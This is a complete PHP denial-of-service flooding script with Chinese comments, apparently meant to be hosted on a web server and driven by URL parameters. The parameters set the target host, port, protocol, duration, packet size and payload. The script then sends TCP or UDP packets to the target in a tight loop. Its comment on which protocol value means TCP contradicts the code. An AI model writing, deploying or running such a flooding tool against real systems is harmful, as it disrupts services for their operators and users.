<?php 
error_reporting(0);//禁用错误报告 
set_time_limit(0);//配置该页最久执行时间。  0为永久执行 
ignore_user_abort(false); //设置与客户机断开是否会终止脚本的执行。 
   
/*get参数*/
$type = $_GET['type']; //攻击方式 0为TCP 1为UDP 
$host = $_GET['host'];  //攻击目标 
$port = $_GET['port'];  //攻击端口 
$exec_time = $_GET['time'];  //持续时间 
$Sendlen = $_GET['size'];   //发送数据长度  如果为0则使用自定义数据包 
$data =  $_GET['data']; //自定义数据包 最大为1024KB 格式为URL编码 
$data = urldecode($data); //URL解码后的字符串 
$count = $_GET['count']; //限制发包次数   0为不限制然后只能通过时间控制 
/*end*/
   
if (function_exists('fsockopen')){$test="1";}else{$test="0";}//fsockopen是否能用 
   
$byte = 0;//记录发包次数 
$max_time = time()+$exec_time;//设置结束时间 
   
if($Sendlen!=0){ 
    for($i=0;$i<$Sendlen;$i++){$out .= "X";}//构造指定长度数据包 
}else{ 
    $out = $data;  //设置为自定义数据包 
} 
   
//死循环发送数据 
while(1){ 
    if(time() > $max_time){break;}//时间到了就跳出循环         
       
    //判断攻击方式 
    if($type==1) {     
        $fp = fsockopen("tcp://$host", $port, $errno, $errstr, 5);//打开TCP连接 
    } else {     
        $fp = fsockopen("udp://$host", $port, $errno, $errstr, 5);//打开UDP连接 
    } 
        if($fp){            //如果连接成功 
            fwrite($fp, $out);  //发送数据 
            fclose($fp);  //关闭连接 
    } 
       
    $byte++;//发包次数加1 
       
    if((int)$count!=0){ 
        if($byte > (int)$count){break;}//发包次数大于设置的就跳出循环 
    }    
} 
?>
